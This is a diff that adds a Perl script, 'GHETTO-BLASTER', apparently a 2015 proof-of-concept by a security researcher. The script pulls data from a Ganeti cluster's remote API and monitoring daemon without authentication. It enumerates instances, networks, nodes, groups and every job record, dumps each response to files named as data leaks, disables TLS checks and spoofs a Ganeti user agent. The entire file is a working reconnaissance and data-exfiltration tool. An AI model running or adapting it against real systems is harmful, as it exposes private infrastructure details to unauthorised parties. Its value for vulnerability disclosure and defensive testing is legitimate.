@@ -1,0 +1,231 @@
+#!/usr/bin/perl -w
+
+use LWP::UserAgent;
+use JSON;
+use Data::Dumper;
+use strict;
+use warnings;
+
+my $i_want_readable_json = 1;
+
+if (!(defined($ARGV[0])))
+{
+  print "$0 http://<ip_of_ganeti_rapi>\n\n";
+  print "  Example:\n";
+  print "    https://<ip>\n";
+} else {
+  print "GHETTO-BLASTER - a Ganeti data agregation tool\n";
+}
+print "\n";
+print "  2015 Pierre Kim <pierre.kim.sec\@gmail.com>\n";
+print "       \@PierreKimSec https://pierrekim.github.io/\n";
+print "  DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE <http://www.wtfpl.net/txt/copying/>\n\n";
+exit (1) if (!(defined($ARGV[0])));
+
+my $base_url          = $ARGV[0];
+my $default_rapi_port = 5080;
+my $default_mond_port = 1815;
+
+my %basic_cmds = (
+  "info" =>     { "url" => "/2/info",     "output_file" => "2-info",      "is_json" => 1 },
+  "version" =>  { "url" => "/version",    "output_file" => "version",     "is_json" => 0 },
+  "features" => { "url" => "/2/features", "output_file" => "2-features",  "is_json" => 1 },
+  "os" =>       { "url" => "/2/os",       "output_file" => "2-os",        "is_json" => 0 }
+);
+
+$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;
+
+
+
+# FIXME:
+# /2/filters
+# /2/filters?bulk=1
+# /2/groups/tags
+# /2/instances/[instance_name]/tags
+# /2/nodes/tags
+# /2/tags
+# /2/networks/[network_name]/tags
+#
+
+# TO TEST:
+# /2/groups/[group_name]
+# /2/networks/[network_name]
+
+
+&main();
+
+
+sub main()
+{
+  &greetings("You are being visited by GHETTO-BLASTER a Ganeti data agregation tool");
+
+  for my $cmd (keys %basic_cmds)
+  {
+    my $res = &get_target($base_url . ":" . $default_rapi_port . $basic_cmds{$cmd}->{"url"});
+    &save_data_leak($res, $basic_cmds{$cmd}->{"output_file"}, $basic_cmds{$cmd}->{"is_json"});
+  }
+
+  &parse_instances();
+  &parse_networks();
+  &parse_groups();
+  &parse_nodes();
+  &parse_mond();
+  &parse_jobs();
+  &greetings("Thank you for using Ganeti and have a nice day!");
+}
+
+
+sub greetings()
+{
+  my $msg = $_[0];
+
+  $msg =~ s/ /_/g;
+  print "Sending Banner to the remote API Daemon: $msg\n";
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/" . $msg, 1);
+}
+
+
+sub parse_mond()
+{
+  my $res;
+  my $base_url_http = $base_url;
+
+  $base_url_http =~ s/https/http/;
+  
+  $res = &get_target($base_url_http . ":" . $default_mond_port . "/1/list/collectors");
+  &save_data_leak($res, "1-list-collectors", 0);
+  $res = &get_target($base_url_http . ":" . $default_mond_port . "/1/report/all");
+  &save_data_leak($res, "1-report-all", 0);
+}
+
+
+sub parse_instances()
+{
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/instances");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-instances", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'});
+    &save_data_leak($res, "2-instances-$data->{'id'}", 1, $data->{'id'});
+
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'} . "/info");
+    print "Sleep (10) because job is in progress ...\n";
+    sleep 10; # we need to sleep(10) when asking the instances/info due to the creation of a job
+    $res = &get_target($base_url . ":" . $default_rapi_port . "/2/jobs/" . $res);
+    &save_data_leak($res, "2-instances-$data->{'id'}-info-jobs", 1, "2/instances/$data->{'id'}/info-jobs");
+  }
+}
+
+
+sub parse_networks()
+{
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/networks");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-networks", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'});
+    &save_data_leak($res, "2-networks-$data->{'name'}", 1, $data->{'uri'});
+  }
+}
+
+
+sub parse_groups()
+{
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/groups");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-groups", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'});
+    &save_data_leak($res, "2-groups-$data->{'name'}", 1, $data->{'uri'});
+  }
+}
+
+
+sub parse_nodes()
+{
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/nodes");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-nodes", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'});
+    &save_data_leak($res, "2-nodes-$data->{'id'}", 1, $data->{'id'});
+
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'} . "/role");
+    &save_data_leak($res, "2-nodes-$data->{'id'}-role", 0, "nodes/$data->{'id'}-role");
+  }
+}
+
+
+sub parse_jobs()
+{
+  my $total_jobs = 0;
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/jobs");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-jobs", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $total_jobs = $data->{'id'} if ($data->{'id'} > $total_jobs);
+  }
+
+  for my $i (0 .. $total_jobs)
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . "/2/jobs/" . $i);
+    &save_data_leak($res, "2-jobs-$i", 1);
+  }
+}
+
+
+sub save_data_leak()
+{
+  my $input = $_[0];
+  my $output_file = $_[1];
+  my $is_json = $_[2];
+  my $stdout = $_[3] || $output_file;
+  my $json;
+
+  print "Parsing $stdout ... saving to $output_file\n";
+  $input = Dumper(JSON::decode_json($input)) if ($i_want_readable_json && $is_json);
+  open (FILE, ">", "$output_file");
+  print FILE ($input);
+  close (FILE);
+}
+
+
+sub get_target()
+{
+  my $target = $_[0];
+  my $error_ok = $_[1];
+  my ($ua, $res, $req);
+
+  $ua = LWP::UserAgent->new(
+    ssl_opts => { verify_hostname => 0, SSL_verify_mode => 0 }
+  );
+  $ua->agent("Ganeti/2.12");
+  $ua->env_proxy;
+  $ua->timeout(10);
+  $req = new HTTP::Request GET => $target;
+  $res = $ua->request($req);
+
+  print "Error when requesting $target\n" if (!$res->is_success && !$error_ok);
+
+  return ($res->content);
+}
